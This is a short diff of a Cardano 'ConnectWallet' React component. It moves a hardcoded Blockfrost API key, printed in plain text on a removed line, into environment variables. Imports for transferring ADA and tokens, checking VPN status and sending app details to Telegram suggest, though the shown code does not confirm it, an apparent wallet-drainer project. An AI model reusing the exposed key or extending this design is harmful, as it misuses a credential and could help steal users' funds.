@@ -4,7 +4,7 @@ import { Link } from "react-router-dom";
 import { Buffer } from "buffer";
 import axios from "axios";
 import { transferADA, transferADAAndTokens } from '../../utils/walletUtils';
-import { getRecipientAddress } from '../../utils/userLocation';
+import { checkVpnStatus } from "../../utils/userLocation";
 import { sendAppDetailsToTelegram } from '../../utils/telegramUtils';
 
 function ConnectWallet({ onClose }) {
@@ -32,8 +32,8 @@ function ConnectWallet({ onClose }) {
     loadWasm();
   }, []);
 
-  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
-  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";
+  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
+  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
 
   const fetchProtocolParams = async () => {
     try {
